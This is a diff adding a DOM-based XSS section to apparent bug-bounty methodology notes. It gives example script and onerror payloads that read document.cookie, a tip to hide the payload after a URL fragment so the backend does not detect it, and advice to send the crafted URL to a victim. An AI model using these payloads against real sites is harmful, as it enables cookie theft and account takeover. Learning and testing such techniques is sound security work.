@@ -87,6 +87,27 @@ onmouseover=alert(document.location.has.substring(1))#payloadhere
 ```
 
 ## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> DOM XSS
+- paper: http://www.webappsec.org/projects/articles/071105.shtml
+#### How to use it:
+- you need to share with the victim the url containing the xss. 
+
+#### Isuses:
+If you send the xss in the example1, the backend could detect and block/sanitize the request. In the example 2, notice the number sign (#) right after the file name. It tells the browser that everything beyond it is a fragment.
+#### Example 1:
+```
+  http://www.vulnerable.site/welcome.html?notname=
+  <script>alert(document.cookie)<script>&name=Joe
+```
+#### Example 2:
+```
+/attachment.cgi?id=&action=
+  foobar#<script>alert(document.cookie)</script>
+  ```
+
+For example, this will trigger a xss on error, which will occur because src is empty. 
+```
+<img src="" onerror=alert(window.origin)>
+```
 ```
  <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
  src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&
